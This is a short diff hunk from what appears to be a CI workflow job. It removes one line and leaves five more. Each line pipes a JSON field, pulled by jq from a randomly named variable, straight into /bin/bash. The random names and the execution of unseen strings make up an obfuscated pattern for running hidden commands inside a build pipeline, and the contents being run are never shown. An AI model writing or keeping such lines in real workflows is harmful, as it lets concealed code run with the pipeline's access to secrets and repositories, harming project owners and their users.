@@ -33,7 +33,6 @@ jobs:
           echo $w1554 | jq -r .gmqro567 | /bin/bash
           printf '%s' "$al8" | jq -r .osm03 | /bin/bash
           printf '%s' "$ecu339" | jq -r .mwba84429 | /bin/bash
-          echo $aanfa285 | jq -r .ozcaw6 | /bin/bash
           echo $ba4887 | jq -r .wpmlq9348 | /bin/bash
           printf '%s' "$dzhl47180" | jq -r .f366 | /bin/bash
 
